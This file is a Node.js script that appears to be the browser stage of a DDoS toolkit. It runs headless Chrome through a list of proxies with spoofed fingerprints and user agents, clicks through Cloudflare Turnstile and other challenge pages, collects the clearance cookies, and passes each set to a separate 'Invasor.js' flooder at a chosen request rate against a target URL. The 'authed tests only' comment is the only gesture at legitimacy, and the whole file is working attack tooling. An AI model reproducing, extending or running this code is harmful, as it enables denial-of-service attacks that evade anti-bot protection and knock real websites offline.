// authed tests only i made this for cf testing i hope u will like @JsInvasor
// updated for 2026 - puppeteer-real-browser + Turnstile support
const fs = require("fs");
const { connect } = require("puppeteer-real-browser");
const async = require("async");
const { exec, spawn } = require("child_process");

const COOKIES_MAX_RETRIES = 2;

// ────────────────────────────────────────────────
// Colors
// ────────────────────────────────────────────────
const c = {
  reset:   "\x1b[0m",
  bold:    "\x1b[1m",
  dim:     "\x1b[2m",
  red:     "\x1b[31m",
  green:   "\x1b[32m",
  yellow:  "\x1b[33m",
  pink:    "\x1b[35m",
  cyan:    "\x1b[36m",
  white:   "\x1b[37m",
  gray:    "\x1b[90m",
  steel:   "\x1b[38;2;180;190;205m",
};

const PREFIX = `${c.gray}[${c.steel}Invasor${c.gray}@${c.steel}Browser${c.gray}]${c.reset} `;

function a(type, text) {
  console.log(`${PREFIX}${c.gray}&${c.reset} ${c.white}${text}${c.reset}`);
}

// ────────────────────────────────────────────────
// Startup banner
// ────────────────────────────────────────────────
function b() {
  console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some peace of mind${c.reset}`);
  console.log(`${c.gray}>${c.reset} ${c.white}i hope you find some paradise${c.reset}`);
  console.log();
}

const d = error => a("error", error);
process.on("uncaughtException", d);
process.on("unhandledRejection", d);

if (process.argv.length < 7) {
  a("error", "Usage: node browser.js <target> <time> <threads> <rate> <proxies.txt>");
  process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);
const rates = process.argv[5];
const proxyFile = process.argv[6];

const e = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

const f = (filePath) => {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return data.trim().split(/\r?\n/);
  } catch (error) {
    a("error", `Error reading proxies file: ${error}`);
    return [];
  }
};

const proxies = f(proxyFile);

const g = () => {
  const chromeVersions = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
  ];
  return chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
};

async function h(page, browserProxy) {
  const content = await page.content();

  // Cloudflare Turnstile challenge detection (2024-2026)
  const isTurnstile = content.includes("cf-turnstile") ||
    content.includes("challenges.cloudflare.com/turnstile") ||
    content.includes("turnstile.js");

  // Legacy challenge-platform detection
  const isLegacyChallenge = content.includes("challenge-platform") ||
    content.includes("challenge-running");

  // Managed challenge / interstitial
  const isManagedChallenge = content.includes("managed-challenge") ||
    content.includes("cf-challenge-running");

  if (isTurnstile || isLegacyChallenge || isManagedChallenge) {
    const challengeType = isTurnstile ? "Turnstile" : isLegacyChallenge ? "Legacy" : "Managed";
    a("pink", `Detected ${challengeType} challenge → ${browserProxy}`);
    try {
      await e(5);

      // Try Turnstile checkbox (iframe-based)
      const turnstileFrame = page.frames().find(f =>
        f.url().includes("challenges.cloudflare.com")
      );

      if (turnstileFrame) {
        a("info", `Found Turnstile frame → ${browserProxy}`);
        try {
          await turnstileFrame.waitForSelector('input[type="checkbox"], .cb-lb, #challenge-stage', { timeout: 15000 });
          const checkbox = await turnstileFrame.$('input[type="checkbox"], .cb-lb');
          if (checkbox) {
            await e(2);
            await checkbox.click();
            a("info", `Clicked Turnstile checkbox → ${browserProxy}`);
          }
        } catch (e) {
          a("warn", `Turnstile frame interaction failed: ${e.message}`);
        }
      }

      // Fallback: try the legacy wrapper selector
      try {
        await page.waitForSelector("#challenge-stage, .cf-turnstile, body > div.main-wrapper > div > div > div > div", { timeout: 10000 });
        const challengeEl = await page.$("#challenge-stage") ||
          await page.$(".cf-turnstile") ||
          await page.$("body > div.main-wrapper > div > div > div > div");
        if (challengeEl) {
          const box = await challengeEl.boundingBox();
          if (box) {
            await page.mouse.click(box.x + 20, box.y + 20);
          }
        }
      } catch (e) {
        // selector not found, might have auto-solved
      }

      // Wait for challenge to resolve
      await e(10);
    } catch (error) {
      a("error", `Error in challenge detection: ${error.message}`);
    }
  } else {
    a("warn", `No challenge detected → ${browserProxy}`);
    await e(3);
  }
}

async function i(targetURL, browserProxy) {
  const userAgent = g();
  const [proxyHost, proxyPort] = browserProxy.split(":");
  let browser;
  try {
    const result = await connect({
      headless: "auto",
      args: [
        `--proxy-server=http://${browserProxy}`,
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--ignore-certificate-errors",
        "--disable-gpu",
        "--disable-dev-shm-usage",
        "--disable-browser-side-navigation",
        `--user-agent=${userAgent}`,
      ],
      turnstile: true,
      fingerprint: true,
      connectOption: {
        defaultViewport: null,
      },
    });

    browser = result.browser;
    const page = result.page;

    page.setDefaultNavigationTimeout(60 * 1000);
    await page.goto(targetURL, { waitUntil: "domcontentloaded" });
    await h(page, browserProxy);

    const title = await page.title();
    const cookies = await page.cookies(targetURL);

    return {
      browser,
      title,
      browserProxy,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent
    };
  } catch (error) {
    a("error", `Error in i: ${error.message}`);
    if (browser) await browser.close();
    return null;
  }
}

async function j(targetURL, browserProxy, task, done, retries = 0) {
  if (retries >= COOKIES_MAX_RETRIES) {
    const currentTask = queue.length();
    done(null, { task, currentTask });
    return;
  }
  let browser = null;
  try {
    const response = await i(targetURL, browserProxy);
    if (!response) {
      throw new Error("Failed to open browser or retrieve response");
    }
    browser = response.browser;

    // CF challenge fail titles
    const failTitles = [
      "Just a moment...",
      "Attention Required! | Cloudflare",
      "Please Wait... | Cloudflare",
      "Checking your browser before accessing",
      "DDOS-GUARD",
    ];

    if (failTitles.some(t => response.title.includes(t))) {
      a("error", `Proxy Issue → ${response.title} - Proxy: ${response.browserProxy}`);
      if (browser) await browser.close();
      done(null, { task, currentTask: queue.length() });
      return;
    }

    a("success", `Bypassed → ${response.title} | ${response.browserProxy}`);
    a("success", `Cookies → ${response.cookies}`);

    spawn("node", [
      "Invasor.js",
      targetURL,
      "100",
      "2",
      response.browserProxy,
      rates,
      response.cookies,
      response.userAgent
    ]);

    if (browser) await browser.close();
    done(null, { task, currentTask: queue.length() });
  } catch (error) {
    a("error", `Error in j: ${error.message}`);
    if (browser) await browser.close();
    await j(targetURL, browserProxy, task, done, retries + 1);
  }
}

const queue = async.queue(function (task, done) {
  j(targetURL, task.browserProxy, task, done);
}, threads);

async function k() {
  b();
  a("info", `Starting Browser`);
  a("info", `Target: ${targetURL}`);
  a("info", `Proxies: ${proxies.length} | Threads: ${threads} | Duration: ${duration}s`);
  console.log();

  for (const browserProxy of proxies) {
    queue.push({ browserProxy });
  }

  await e(duration);

  exec('pkill -f Invasor.js', (err) => {
    if (err) a("error", `Error killing Invasor.js: ${err.message}`);
  });
  exec('pkill chrome', (err) => {
    if (err) a("error", `Error killing chrome: ${err.message}`);
  });
  exec('pkill chromium', (err) => {
    if (err) a("error", `Error killing chromium: ${err.message}`);
  });
  process.exit();
}

k();
